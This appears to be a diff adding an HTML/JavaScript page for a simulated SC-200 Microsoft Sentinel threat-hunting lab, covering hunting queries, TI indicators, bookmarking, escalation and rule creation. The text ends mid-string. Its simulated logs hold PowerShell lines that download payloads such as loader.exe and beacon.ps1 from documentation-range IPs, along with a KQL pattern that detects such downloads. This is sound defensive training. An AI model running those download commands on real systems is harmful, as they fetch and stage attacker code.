@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('sorted');</script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <script src="../../../../components/FirebaseAuth.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sentinel Threat Hunting Lab -- SC-200 Chapter 9</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { height: 100vh; overflow: hidden; background: #0c0c0c; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #f5b3b3; display: flex; flex-direction: column; }
+        .lab-header { flex-shrink: 0; padding: 15px 30px; background: rgba(10,6,8,0.95); border-bottom: 1px solid rgba(239,68,68,0.2); display: flex; justify-content: space-between; align-items: center; }
+        .header-left { display: flex; align-items: center; gap: 20px; }
+        .back-btn { padding: 8px 16px; background: rgba(239,68,68,0.1); border: 1px solid rgba(239,68,68,0.3); border-radius: 6px; color: #ef4444; text-decoration: none; font-size: 0.85rem; transition: all 0.3s ease; }
+        .back-btn:hover { background: rgba(239,68,68,0.2); }
+        .lab-title { font-size: 1rem; color: #fde2e2; }
+        .lab-badge { padding: 4px 12px; background: rgba(239,68,68,0.15); border: 1px solid rgba(239,68,68,0.3); border-radius: 12px; font-size: 0.7rem; color: #f87171; letter-spacing: 0.05em; }
+        .lab-badge-ch { padding: 4px 12px; background: rgba(52,211,153,0.15); border: 1px solid rgba(52,211,153,0.3); border-radius: 12px; font-size: 0.7rem; color: #34d399; letter-spacing: 0.05em; }
+        .task-progress { display: flex; align-items: center; gap: 15px; font-size: 0.85rem; color: #7a4040; }
+        .task-count { color: #ef4444; font-weight: 500; }
+        .progress-bar-wrap { width: 140px; height: 6px; background: rgba(239,68,68,0.15); border-radius: 3px; overflow: hidden; }
+        .progress-bar-fill { height: 100%; background: linear-gradient(90deg, #ef4444, #991b1b); border-radius: 3px; width: 0%; transition: width 0.4s ease; }
+        .lab-container { display: grid; grid-template-columns: 320px 1fr; flex: 1; min-height: 0; }
+        .task-panel { background: rgba(10,6,8,0.95); border-right: 1px solid rgba(239,68,68,0.15); overflow-y: auto; padding: 20px; }
+        .task-section { margin-bottom: 25px; }
+        .task-section-title { font-size: 0.68rem; color: #5a2020; letter-spacing: 0.15em; margin-bottom: 12px; text-transform: uppercase; }
+        .task-card { background: rgba(20,10,16,0.8); border: 1px solid rgba(239,68,68,0.15); border-radius: 10px; padding: 14px; margin-bottom: 8px; cursor: pointer; transition: all 0.3s ease; }
+        .task-card:hover { border-color: rgba(239,68,68,0.4); }
+        .task-card.active { border-color: #ef4444; background: rgba(239,68,68,0.1); }
+        .task-card.completed { border-color: rgba(52,211,153,0.4); background: rgba(52,211,153,0.04); }
+        .task-card.completed .task-name::after { content: ' [done]'; font-size: 0.72rem; color: #34d399; font-weight: 400; }
+        .task-number { font-size: 0.68rem; color: #ef4444; margin-bottom: 4px; }
+        .task-name { font-size: 0.9rem; color: #fde2e2; margin-bottom: 4px; }
+        .task-desc { font-size: 0.77rem; color: #7a4040; line-height: 1.45; }
+        .task-desc code { background: rgba(239,68,68,0.15); padding: 1px 5px; border-radius: 3px; font-size: 0.82em; color: #f87171; font-family: 'Consolas', monospace; }
+        .terminal-panel { display: flex; flex-direction: column; background: #0a0a0a; position: relative; overflow: hidden; }
+        .term-toolbar { flex-shrink: 0; padding: 8px 20px; background: rgba(20,10,16,0.9); border-bottom: 1px solid rgba(239,68,68,0.15); display: flex; align-items: center; gap: 12px; }
+        .term-dot { width: 12px; height: 12px; border-radius: 50%; } .term-dot-red { background: #ff5f57; } .term-dot-amber { background: #febc2e; } .term-dot-green { background: #28c840; }
+        .term-title { flex: 1; text-align: center; font-size: 0.8rem; color: #5a3030; font-family: 'Consolas', monospace; }
+        .term-vm-status { display: flex; align-items: center; gap: 6px; font-size: 0.75rem; color: #34d399; }
+        .term-status-dot { width: 7px; height: 7px; background: #34d399; border-radius: 50%; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+        .term-output { flex: 1; overflow-y: auto; padding: 16px 360px 8px 20px; font-family: 'Consolas', monospace; font-size: 0.875rem; line-height: 1.6; }
+        .term-input-row { flex-shrink: 0; display: flex; align-items: center; padding: 8px 360px 12px 20px; border-top: 1px solid rgba(239,68,68,0.1); gap: 0; }
+        .term-prompt-label { font-family: 'Consolas', monospace; font-size: 0.875rem; white-space: nowrap; flex-shrink: 0; }
+        .term-prompt-user { color: #ef4444; } .term-prompt-sep { color: #5a2020; } .term-prompt-path { color: #34d399; } .term-prompt-dollar { color: #fde2e2; margin-right: 6px; }
+        .term-input { flex: 1; background: transparent; border: none; outline: none; color: #fde2e2; font-family: 'Consolas', monospace; font-size: 0.875rem; caret-color: #ef4444; }
+        .term-line { white-space: pre-wrap; word-break: break-all; }
+        .term-line-cmd { color: #f5b3b3; } .term-line-out { color: #a0d4a0; } .term-line-err { color: #f87171; } .term-line-info { color: #f87171; } .term-line-warn { color: #fbbf24; } .term-line-dim { color: #4a2020; } .term-welcome { color: #ef4444; }
+        .term-prompt-span { color: #ef4444; } .term-path-span { color: #34d399; } .term-ps1-sep { color: #5a2020; }
+        .json-key { color: #f87171; } .json-string { color: #86efac; } .json-number { color: #fbbf24; } .json-bool { color: #93c5fd; } .json-null { color: #f87171; }
+        .instructions-panel { position: absolute; top: 20px; right: 20px; width: 320px; background: rgba(10,6,8,0.97); border: 1px solid rgba(239,68,68,0.3); border-radius: 12px; padding: 20px; z-index: 100; box-shadow: 0 10px 30px rgba(0,0,0,0.4); transition: all 0.3s ease; }
+        .instructions-panel.collapsed { width: auto; padding: 10px 14px; cursor: pointer; }
+        .instructions-panel.collapsed .instructions-body { display: none; }
+        .instructions-title { font-size: 1rem; color: #ef4444; margin-bottom: 15px; display: flex; align-items: center; gap: 10px; cursor: pointer; }
+        .instructions-panel.collapsed .instructions-title { margin-bottom: 0; font-size: 0.85rem; }
+        .instructions-toggle { margin-left: auto; width: 28px; height: 28px; background: rgba(239,68,68,0.2); border: 1px solid rgba(239,68,68,0.3); border-radius: 6px; color: #ef4444; font-size: 0.75rem; cursor: pointer; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+        .instructions-step { font-size: 0.88rem; color: #f5b3b3; line-height: 1.65; margin-bottom: 14px; }
+        .instructions-step code { background: rgba(239,68,68,0.2); padding: 2px 7px; border-radius: 4px; font-family: 'Consolas', monospace; color: #f87171; font-size: 0.85em; }
+        .instructions-hint { font-size: 0.78rem; color: #5a2020; font-style: italic; margin-top: 14px; padding-top: 14px; border-top: 1px solid rgba(239,68,68,0.15); line-height: 1.5; }
+        .hint-btn { margin-top: 12px; padding: 6px 12px; background: rgba(239,68,68,0.12); border: 1px solid rgba(239,68,68,0.25); border-radius: 5px; color: #ef4444; font-size: 0.75rem; cursor: pointer; font-family: 'Segoe UI', sans-serif; width: 100%; text-align: center; }
+        .hint-command { display: none; margin-top: 10px; padding: 8px 10px; background: rgba(0,0,0,0.4); border: 1px solid rgba(239,68,68,0.25); border-radius: 6px; font-family: 'Consolas', monospace; font-size: 0.78rem; color: #86efac; line-height: 1.55; white-space: pre-wrap; }
+        .hint-command.visible { display: block; }
+        .success-overlay { position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.82); display: none; align-items: center; justify-content: center; z-index: 2000; }
+        .success-overlay.active { display: flex; }
+        .success-card { background: rgba(10,6,8,0.97); border: 1px solid rgba(52,211,153,0.35); border-radius: 16px; padding: 40px; text-align: center; max-width: 480px; width: 90%; }
+        .success-title { font-size: 1.5rem; color: #34d399; margin-bottom: 10px; }
+        .success-message { color: #f5b3b3; margin-bottom: 25px; line-height: 1.65; font-size: 0.95rem; }
+        .success-btn { padding: 12px 30px; background: linear-gradient(135deg, #ef4444, #991b1b); border: none; border-radius: 8px; color: white; font-size: 0.95rem; cursor: pointer; }
+        @media (max-width: 1024px) { .lab-container { grid-template-columns: 1fr; } .task-panel { display: none; } .term-output, .term-input-row { padding-right: 20px; } .instructions-panel { position: absolute; bottom: 60px; top: auto; right: 10px; left: 10px; width: auto; } }
+    </style>
+</head>
+<body>
+    <header class="lab-header">
+        <div class="header-left">
+            <a href="../index.html" class="back-btn">Exit Lab</a>
+            <span class="lab-title">Sentinel Threat Hunting Lab</span>
+            <span class="lab-badge">SC-200</span>
+            <span class="lab-badge-ch">CH.9</span>
+        </div>
+        <div class="task-progress">
+            <span>Progress:</span>
+            <div class="progress-bar-wrap"><div class="progress-bar-fill" id="progressBarFill"></div></div>
+            <span class="task-count" id="taskProgress">0 / 10 Tasks</span>
+        </div>
+    </header>
+    <div class="lab-container">
+        <aside class="task-panel" id="taskPanel"><div class="task-section"><div class="task-section-title">Phase 1 -- Hunting Setup</div><div class="task-card" id="task-card-1" data-task="1" onclick="selectTask(1)"><div class="task-number">Task 1</div><div class="task-name">List Hunting Queries</div><div class="task-desc">Run <code>sentinel-hunt list-queries --tactic "Initial Access"</code> to browse built-in hunting queries filtered by MITRE tactic.</div></div><div class="task-card" id="task-card-2" data-task="2" onclick="selectTask(2)"><div class="task-number">Task 2</div><div class="task-name">Check MITRE Coverage</div><div class="task-desc">Run <code>sentinel-hunt mitre-coverage</code> to view your MITRE ATT&amp;CK detection coverage heatmap and identify blind spots.</div></div><div class="task-card" id="task-card-3" data-task="3" onclick="selectTask(3)"><div class="task-number">Task 3</div><div class="task-name">View TI Indicators</div><div class="task-desc">Run <code>sentinel-hunt ti-indicators --active</code> to list active threat intelligence indicators imported from connected feeds.</div></div></div><div class="task-section"><div class="task-section-title">Phase 2 -- KQL Hunting</div><div class="task-card" id="task-card-4" data-task="4" onclick="selectTask(4)"><div class="task-number">Task 4</div><div class="task-name">Hunt for PowerShell Downloads</div><div class="task-desc">Run <code>sentinel-hunt run-query --id hunt-ps-download</code> to execute a KQL hunting query for PowerShell-based payload downloads.</div></div><div class="task-card" id="task-card-5" data-task="5" onclick="selectTask(5)"><div class="task-number">Task 5</div><div class="task-name">Hunt for TI Matches</div><div class="task-desc">Run <code>sentinel-hunt run-query --id hunt-ti-ip-match</code> to search for connections to known malicious IPs from threat intelligence.</div></div><div class="task-card" id="task-card-6" data-task="6" onclick="selectTask(6)"><div class="task-number">Task 6</div><div class="task-name">Bookmark Suspicious Results</div><div class="task-desc">Run <code>sentinel-hunt bookmark --query hunt-ps-download --rows 2,5 --note "Suspicious PS downloads from WORKSTATION-14"</code> to tag evidence.</div></div></div><div class="task-section"><div class="task-section-title">Phase 3 -- Livestream &amp; Notebooks</div><div class="task-card" id="task-card-7" data-task="7" onclick="selectTask(7)"><div class="task-number">Task 7</div><div class="task-name">Start Livestream Session</div><div class="task-desc">Run <code>sentinel-hunt livestream --query hunt-ps-download</code> to start real-time monitoring of PowerShell download events.</div></div><div class="task-card" id="task-card-8" data-task="8" onclick="selectTask(8)"><div class="task-number">Task 8</div><div class="task-name">Launch Notebook Investigation</div><div class="task-desc">Run <code>sentinel-hunt notebook --template account-compromise</code> to launch a Jupyter notebook for deep-dive analysis with MSTICPy.</div></div></div><div class="task-section"><div class="task-section-title">Phase 4 -- Escalation</div><div class="task-card" id="task-card-9" data-task="9" onclick="selectTask(9)"><div class="task-number">Task 9</div><div class="task-name">Promote Bookmark to Incident</div><div class="task-desc">Run <code>sentinel-hunt escalate --bookmark BM-0047 --severity High</code> to create an incident from the bookmarked evidence.</div></div><div class="task-card" id="task-card-10" data-task="10" onclick="selectTask(10)"><div class="task-number">Task 10</div><div class="task-name">Create Analytics Rule from Hunt</div><div class="task-desc">Run <code>sentinel-hunt promote-rule --query hunt-ps-download --frequency 1h</code> to convert the hunting query into a scheduled analytics rule.</div></div></div></aside>
+        <main class="terminal-panel" id="terminalPanel">
+            <div class="term-toolbar">
+                <div class="term-dot term-dot-red"></div><div class="term-dot term-dot-amber"></div><div class="term-dot term-dot-green"></div>
+                <div class="term-title">socanalyst@hunting-lab -- bash</div>
+                <div class="term-vm-status"><div class="term-status-dot"></div>Hunting Lab Online</div>
+            </div>
+            <div class="term-output" id="termOutput"></div>
+            <div class="term-input-row">
+                <span class="term-prompt-label"><span class="term-prompt-user">socanalyst@hunting-lab</span><span class="term-prompt-sep">:</span><span class="term-prompt-path" id="termPS1Path">~</span><span class="term-prompt-dollar">$</span></span>
+                <input class="term-input" id="termInput" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" aria-label="Terminal input" />
+            </div>
+            <div class="instructions-panel" id="instructionsPanel">
+                <div class="instructions-title" onclick="toggleInstructions()">
+                    <img src="/assets/images/icons/icon-clipboard.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block">
+                    Task Instructions
+                    <button class="instructions-toggle" id="instructionsToggle">&#9660;</button>
+                </div>
+                <div class="instructions-body" id="instructionsBody">
+                    <div class="instructions-step" id="instructionsStep">Type the command in the terminal and press Enter.</div>
+                    <div class="instructions-hint" id="instructionsHint">Hint text loads when you select a task.</div>
+                    <button class="hint-btn" onclick="revealHint()" id="hintBtn">Show command hint</button>
+                    <div class="hint-command" id="hintCommand"></div>
+                </div>
+            </div>
+            <div class="success-overlay" id="successOverlay">
+                <div class="success-card">
+                    <div class="success-title">SC-200 Chapter 9 Lab Complete!</div>
+                    <div class="success-message">You browsed hunting queries by MITRE tactic, checked detection coverage gaps, reviewed threat intelligence indicators, ran KQL hunting queries, bookmarked evidence, monitored live events with livestream, launched a Jupyter notebook investigation, escalated findings to an incident, and promoted a hunt to a scheduled analytics rule. These are the core Sentinel threat hunting workflows for the SC-200 exam.</div>
+                    <button class="success-btn" onclick="finishLab()">Complete Lab</button>
+                </div>
+            </div>
+        </main>
+    </div>
+    <script>
+    (function(){
+        'use strict';
+        var TOTAL_TASKS = 10;
+        var taskDone = {}; for(var i=1;i<=TOTAL_TASKS;i++) taskDone[i]=false;
+        var currentTask = 1;
+        var cmdHistory = [], histIdx = -1;
+        var outputEl, inputEl, ps1PathEl;
+
+        var TASK_INSTRUCTIONS = {1:{step:"List built-in hunting queries filtered by MITRE tactic:\n<code>sentinel-hunt list-queries --tactic \"Initial Access\"</code>\n\nReview available queries, their result counts, and mapped techniques.",hint:"The hunting dashboard organizes queries by MITRE ATT&CK tactic. Filter to focus on specific attack stages.",cmd:"sentinel-hunt list-queries --tactic \"Initial Access\""},2:{step:"View your MITRE ATT&CK detection coverage:\n<code>sentinel-hunt mitre-coverage</code>\n\nIdentify techniques with no analytics rules -- these are your hunting priorities.",hint:"White gaps in the MITRE coverage map represent blind spots where you have no automated detection.",cmd:"sentinel-hunt mitre-coverage"},3:{step:"List active threat intelligence indicators:\n<code>sentinel-hunt ti-indicators --active</code>\n\nReview imported IOCs from connected TI feeds.",hint:"TI indicators populate the ThreatIntelligenceIndicator table. They include malicious IPs, domains, and file hashes.",cmd:"sentinel-hunt ti-indicators --active"},4:{step:"Run a hunting query for PowerShell-based downloads:\n<code>sentinel-hunt run-query --id hunt-ps-download</code>\n\nThis KQL query searches for Invoke-WebRequest, wget, curl, and DownloadString in PowerShell commands.",hint:"Hypothesis: attackers are using PowerShell to download payloads. The query searches DeviceProcessEvents for download commands.",cmd:"sentinel-hunt run-query --id hunt-ps-download"},5:{step:"Run a hunting query for TI indicator matches:\n<code>sentinel-hunt run-query --id hunt-ti-ip-match</code>\n\nThis joins the ThreatIntelligenceIndicator table with CommonSecurityLog to find connections to known malicious IPs.",hint:"TI matching hunts join indicator tables with log tables. Any match means a device in your environment contacted a known-bad IP.",cmd:"sentinel-hunt run-query --id hunt-ti-ip-match"},6:{step:"Bookmark suspicious results from the PowerShell hunt:\n<code>sentinel-hunt bookmark --query hunt-ps-download --rows 2,5 --note \"Suspicious PS downloads from WORKSTATION-14\"</code>\n\nThis saves the selected rows as evidence with your analyst notes.",hint:"Bookmarks preserve query results, timestamps, and notes. They can be promoted to incidents later.",cmd:"sentinel-hunt bookmark --query hunt-ps-download --rows 2,5 --note \"Suspicious PS downloads from WORKSTATION-14\""},7:{step:"Start a livestream session to monitor in real time:\n<code>sentinel-hunt livestream --query hunt-ps-download</code>\n\nThe query runs continuously against incoming events. Matches appear as they arrive.",hint:"Livestream is for active incident response -- monitoring attacker actions in real time. It runs until you stop it.",cmd:"sentinel-hunt livestream --query hunt-ps-download"},8:{step:"Launch a Jupyter notebook for advanced analysis:\n<code>sentinel-hunt notebook --template account-compromise</code>\n\nThis opens an MSTICPy notebook for statistical analysis beyond KQL.",hint:"Notebooks extend hunting with Python-based anomaly detection, timeline visualization, and threat intelligence enrichment.",cmd:"sentinel-hunt notebook --template account-compromise"},9:{step:"Promote a bookmark to an incident:\n<code>sentinel-hunt escalate --bookmark BM-0047 --severity High</code>\n\nThis creates an incident from the bookmarked evidence for the SOC team.",hint:"Bookmarks can be promoted to incidents when evidence confirms a threat. The incident includes all bookmarked entities and notes.",cmd:"sentinel-hunt escalate --bookmark BM-0047 --severity High"},10:{step:"Convert the hunting query to a scheduled analytics rule:\n<code>sentinel-hunt promote-rule --query hunt-ps-download --frequency 1h</code>\n\nThis creates a detection rule that runs automatically every hour.",hint:"Successful hunts should become analytics rules. This converts a one-time manual hunt into continuous automated detection.",cmd:"sentinel-hunt promote-rule --query hunt-ps-download --frequency 1h"}};
+
+        var TASK_NAMES = {};
+        TASK_NAMES[1]="List Hunting Queries";
+        TASK_NAMES[2]="Check MITRE Coverage";
+        TASK_NAMES[3]="View TI Indicators";
+        TASK_NAMES[4]="Hunt for PowerShell Downloads";
+        TASK_NAMES[5]="Hunt for TI Matches";
+        TASK_NAMES[6]="Bookmark Suspicious Results";
+        TASK_NAMES[7]="Start Livestream Session";
+        TASK_NAMES[8]="Launch Notebook Investigation";
+        TASK_NAMES[9]="Promote Bookmark to Incident";
+        TASK_NAMES[10]="Create Analytics Rule from Hunt";
+
+        var CMD_RESPONSES = {"sentinel-hunt list-queries --tactic \"Initial Access\"":{"lines":[{"text":"=== Hunting Queries -- Tactic: Initial Access ===","cls":"term-line-info"},{"text":"","cls":"term-line-out"},{"text":"  Query ID                    Name                                Results (24h)   Technique","cls":"term-line-warn"},{"text":"  hunt-phish-link-click       Phishing Link Clicks                42              T1566.002","cls":"term-line-out"},{"text":"  hunt-ps-download            PowerShell Payload Downloads        7               T1059.001","cls":"term-line-err"},{"text":"  hunt-brute-force            Brute Force Sign-In Attempts        128             T1110.001","cls":"term-line-out"},{"text":"  hunt-oauth-consent           Suspicious OAuth App Consent       3               T1566.003","cls":"term-line-err"},{"text":"  hunt-mfa-fatigue            MFA Fatigue / Push Spam             12              T1621","cls":"term-line-out"},{"text":"","cls":"term-line-out"},{"text":"  5 queries found | 2 with anomalous results (flagged in red)","cls":"term-line-dim"}],"completesTask":1},"sentinel-hunt mitre-coverage":{"lines":[{"text":"=== MITRE ATT&CK Detection Coverage ===","cls":"term-line-info"},{"text":"","cls":"term-line-out"},{"text":"  Tactic                    Rules   Coverage","cls":"term-line-warn"},{"text":"  Initial Access            8       [########--]  80%","cls":"term-line-out"},{"text":"  Execution                 12      [##########]  100%","cls":"term-line-out"},{"text":"  Persistence               6       [######----]  60%","cls":"term-line-warn"},{"text":"  Privilege Escalation      5       [#####-----]  50%","cls":"term-line-warn"},{"text":"  Defense Evasion           3       [###-------]  30%","cls":"term-line-err"},{"text":"  Credential Access         9       [#########-]  90%","cls":"term-line-out"},{"text":"  Discovery                 4       [####------]  40%","cls":"term-line-err"},{"text":"  Lateral Movement          7       [#######---]  70%","cls":"term-line-out"},{"text":"  Collection                2       [##--------]  20%","cls":"term-line-err"},{"text":"  Command and Control       5       [#####-----]  50%","cls":"term-line-warn"},{"text":"  Exfiltration              1       [#---------]  10%","cls":"term-line-err"},{"text":"  Impact                    6       [######----]  60%","cls":"term-line-warn"},{"text":"","cls":"term-line-out"},{"text":"  PRIORITY GAPS: Defense Evasion (30%), Collection (20%), Exfiltration (10%)","cls":"term-line-err"},{"text":"  Recommend creating hunting queries for these blind spots","cls":"term-line-dim"}],"completesTask":2},"sentinel-hunt ti-indicators --active":{"lines":[{"text":"=== Active Threat Intelligence Indicators ===","cls":"term-line-info"},{"text":"","cls":"term-line-out"},{"text":"  Source                    Type       Indicator                          Confidence   Expires","cls":"term-line-warn"},{"text":"  MDTI                     IP         198.51.100.47                      High         2026-05-15","cls":"term-line-out"},{"text":"  TAXII-AlienVault          IP         203.0.113.88                       High         2026-05-01","cls":"term-line-out"},{"text":"  MDTI                     Domain     malware-c2.evil.example            High         2026-05-20","cls":"term-line-err"},{"text":"  TAXII-AlienVault          FileHash   a1b2c3d4e5f6...78901234           Medium       2026-04-30","cls":"term-line-out"},{"text":"  Custom Upload             IP         192.0.2.200                        High         2026-06-01","cls":"term-line-out"},{"text":"","cls":"term-line-out"},{"text":"  5 active indicators | 3 sources connected | ThreatIntelligenceIndicator table populated","cls":"term-line-dim"}],"completesTask":3},"sentinel-hunt run-query --id hunt-ps-download":{"lines":[{"text":"=== Hunting Query: hunt-ps-download ===","cls":"term-line-info"},{"text":"  Hypothesis: Attackers using PowerShell to download payloads","cls":"term-line-dim"},{"text":"  MITRE: T1059.001 (PowerShell)","cls":"term-line-dim"},{"text":"","cls":"term-line-out"},{"text":"  KQL: DeviceProcessEvents | where FileName =~ \"powershell.exe\"","cls":"term-line-warn"},{"text":"       | where ProcessCommandLine has_any (\"Invoke-WebRequest\", \"wget\", \"DownloadString\")","cls":"term-line-warn"},{"text":"","cls":"term-line-out"},{"text":"  Row  Timestamp              Device              User                Command","cls":"term-line-warn"},{"text":"  1    2026-04-21 08:12:03    WORKSTATION-07      alice@contoso.com   powershell -c Invoke-WebRequest https://updates.contoso.com/patch.ps1","cls":"term-line-out"},{"text":"  2    2026-04-21 09:45:17    WORKSTATION-14      jsmith@contoso.com  powershell -c Invoke-WebRequest http://198.51.100.47/loader.exe -OutFile C:\\Temp\\svc.exe","cls":"term-line-err"},{"text":"  3    2026-04-21 10:03:44    SERVER-DB02         svc-backup          powershell -c wget https://repo.contoso.com/tools/backup.zip","cls":"term-line-out"},{"text":"  4    2026-04-21 11:22:08    WORKSTATION-03      bob@contoso.com     powershell -c Invoke-WebRequest https://learn.microsoft.com/scripts/setup.ps1","cls":"term-line-out"},{"text":"  5    2026-04-21 12:01:55    WORKSTATION-14      jsmith@contoso.com  powershell -c (New-Object Net.WebClient).DownloadString('http://203.0.113.88/beacon.ps1')","cls":"term-line-err"},{"text":"  6    2026-04-21 13:18:22    WORKSTATION-22      carol@contoso.com   powershell -c Invoke-WebRequest https://intranet.contoso.com/deploy.ps1","cls":"term-line-out"},{"text":"  7    2026-04-21 14:40:09    WORKSTATION-14      jsmith@contoso.com  powershell -c Invoke-WebRequest http://198.51.100.47/stage2.dll -OutFile C:\\Temp\\update.dll","cls":"term-line-err"},{"text":"","cls":"term-line-out"},{"text":"  7 results | 3 SUSPICIOUS (rows 2, 5, 7 -- external IPs matching TI indicators, same user)","cls":"term-line-err"}],"completesTask":4},"sentinel-hunt run-query --id hunt-ti-ip-match":{"lines":[{"text":"=== Hunting Query: hunt-ti-ip-match ===","cls":"term-line-info"},{"text":"  Hypothesis: Devices connecting to known C2 infrastructure","cls":"term-line-dim"},{"text":"  Join: ThreatIntelligenceIndicator + CommonSecurityLog","cls":"term-line-dim"},{"text":"","cls":"term-line-out"},{"text":"  Row  Timestamp              SourceIP        DestinationIP      ThreatType           Device","cls":"term-line-warn"},{"text":"  1    2026-04-21 09:45:17    10.0.1.14       198.51.100.47      C2                   WORKSTATION-14","cls":"term-line-err"},{"text":"  2    2026-04-21 12:01:55    10.0.1.14       203.0.113.88       C2                   WORKSTATION-14","cls":"term-line-err"},{"text":"  3    2026-04-21 14:40:09    10.0.1.14       198.51.100.47      C2                   WORKSTATION-14","cls":"term-line-err"},{"text":"","cls":"term-line-out"},{"text":"  3 matches | ALL from WORKSTATION-14 (10.0.1.14) | User: jsmith@contoso.com","cls":"term-line-err"},{"text":"  CRITICAL: Single host contacting multiple known C2 IPs -- possible active compromise","cls":"term-line-err"}],"completesTask":5},"sentinel-hunt bookmark --query hunt-ps-download --rows 2,5 --note \"Suspicious PS downloads from WORKSTATION-14\"":{"lines":[{"text":"=== Bookmark Created ===","cls":"term-line-info"},{"text":"","cls":"term-line-out"},{"text":"  Bookmark ID:    BM-0047","cls":"term-line-out"},{"text":"  Query:          hunt-ps-download","cls":"term-line-out"},{"text":"  Saved Rows:     2, 5","cls":"term-line-out"},{"text":"  Note:           Suspicious PS downloads from WORKSTATION-14","cls":"term-line-warn"},{"text":"","cls":"term-line-out"},{"text":"  Entity Mappings:","cls":"term-line-warn"},{"text":"    Account:   jsmith@contoso.com","cls":"term-line-out"},{"text":"    Host:      WORKSTATION-14","cls":"term-line-out"},{"text":"    IP:        198.51.100.47, 203.0.113.88","cls":"term-line-err"},{"text":"","cls":"term-line-out"},{"text":"  Bookmark saved to Hunting > Bookmarks tab","cls":"term-line-dim"},{"text":"  Entities available in investigation graph","cls":"term-line-dim"}],"completesTask":6},"sentinel-hunt livestream --query hunt-ps-download":{"lines":[{"text":"=== Livestream Session Started ===","cls":"term-line-info"},{"text":"","cls":"term-line-out"},{"text":"  Query:          hunt-ps-download","cls":"term-line-out"},{"text":"  Refresh:        Every 30 seconds","cls":"term-line-out"},{"text":"  Status:         MONITORING","cls":"term-line-warn"},{"text":"","cls":"term-line-out"},{"text":"  [14:55:30] Polling for new events...","cls":"term-line-dim"},{"text":"  [14:56:00] Polling for new events...","cls":"term-line-dim"},{"text":"  [14:56:30] -- MATCH FOUND --","cls":"term-line-err"},{"text":"    2026-04-21 14:56:28  WORKSTATION-14  jsmith@contoso.com","cls":"term-line-err"},{"text":"    powershell -c Invoke-WebRequest http://198.51.100.47/exfil.ps1 -OutFile C:\\Temp\\report.ps1","cls":"term-line-err"},{"text":"  [14:57:00] Polling for new events...","cls":"term-line-dim"},{"text":"  [14:57:30] No new matches","cls":"term-line-dim"},{"text":"","cls":"term-line-out"},{"text":"  Livestream active -- 1 match detected in real time","cls":"term-line-warn"},{"text":"  Session will run until manually stopped or browser closes","cls":"term-line-dim"}],"completesTask":7},"sentinel-hunt notebook --template account-compromise":{"lines":[{"text":"=== Jupyter Notebook -- Account Compromise Investigation ===","cls":"term-line-info"},{"text":"","cls":"term-line-out"},{"text":"  Template:       account-compromise","cls":"term-line-out"},{"text":"  Compute:        Azure ML -- ml-sentinel-compute-01 (Standard_DS3_v2)","cls":"term-line-out"},{"text":"  Library:        MSTICPy 2.8.0","cls":"term-line-out"},{"text":"","cls":"term-line-out"},{"text":"  [Starting] Connecting to Sentinel workspace...","cls":"term-line-dim"},{"text":"  [OK] Authenticated to workspace: sentinel-soc-prod","cls":"term-line-out"},{"text":"  [OK] MSTICPy initialized with TI providers: MDTI, VirusTotal, AbuseIPDB","cls":"term-line-out"},{"text":"","cls":"term-line-out"},{"text":"  Notebook Cells Available:","cls":"term-line-warn"},{"text":"    1. Query sign-in timeline for jsmith@contoso.com (last 30 days)","cls":"term-line-out"},{"text":"    2. Anomaly detection on sign-in locations and times","cls":"term-line-out"},{"text":"    3. Process tree analysis for WORKSTATION-14","cls":"term-line-out"},{"text":"    4. TI enrichment for contacted IPs (198.51.100.47, 203.0.113.88)","cls":"term-line-out"},{"text":"    5. Timeline visualization of all suspicious activity","cls":"term-line-out"},{"text":"","cls":"term-line-out"},{"text":"  Notebook ready for interactive analysis","cls":"term-line-dim"},{"text":"  MSTICPy provides enrichment, visualization, and anomaly detection beyond KQL","cls":"term-line-dim"}],"completesTask":8},"sentinel-hunt escalate --bookmark BM-0047 --severity High":{"lines":[{"text":"=== Incident Created from Bookmark ===","cls":"term-line-info"},{"text":"","cls":"term-line-out"},{"text":"  Incident ID:    INC-2026-04-21-0089","cls":"term-line-out"},{"text":"  Title:          Suspected PowerShell C2 Activity -- WORKSTATION-14","cls":"term-line-warn"},{"text":"  Severity:       High","cls":"term-line-err"},{"text":"  Status:         New","cls":"term-line-out"},{"text":"","cls":"term-line-out"},{"text":"  Evidence (from bookmark BM-0047):","cls":"term-line-warn"},{"text":"    Account:      jsmith@contoso.com","cls":"term-line-out"},{"text":"    Host:         WORKSTATION-14 (10.0.1.14)","cls":"term-line-out"},{"text":"    C2 IPs:       198.51.100.47, 203.0.113.88","cls":"term-line-err"},{"text":"    Activity:     PowerShell downloading payloads from TI-flagged IPs","cls":"term-line-err"},{"text":"","cls":"term-line-out"},{"text":"  Incident assigned to SOC queue for investigation and response","cls":"term-line-dim"},{"text":"  All bookmark entities linked in investigation graph","cls":"term-line-dim"}],"completesTask":9},"sentinel-hunt promote-rule --query hunt-ps-download --frequency 1h":{"lines":[{"text":"=== Analytics Rule Created from Hunting Query ===","cls":"term-line-info"},{"text":"","cls":"term-line-out"},{"text":"  Rule Name:      PowerShell Payload Download Detection","cls":"term-line-out"},{"text":"  Source Query:   hunt-ps-download","cls":"term-line-out"},{"text":"  Type:           Scheduled","cls":"term-line-warn"},{"text":"  Frequency:      Every 1 hour","cls":"term-line-out"},{"text":"  Lookback:       1 hour","cls":"term-line-out"},{"text":"  Severity:       High","cls":"term-line-out"},{"text":"  MITRE Mapping:  T1059.001 (PowerShell)","cls":"term-line-out"},{"text":"","cls":"term-line-out"},{"text":"  Entity Mappings:","cls":"term-line-warn"},{"text":"    Account:   AccountName from query results","cls":"term-line-out"},{"text":"    Host:      DeviceName from query results","cls":"term-line-out"},{"text":"","cls":"term-line-out"},{"text":"  [OK] Rule created and enabled -- will generate incidents automatically","cls":"term-line-out"},{"text":"  Hunt successfully converted to continuous automated detection","cls":"term-line-dim"},{"text":"  MITRE coverage for T1059.001 now includes this 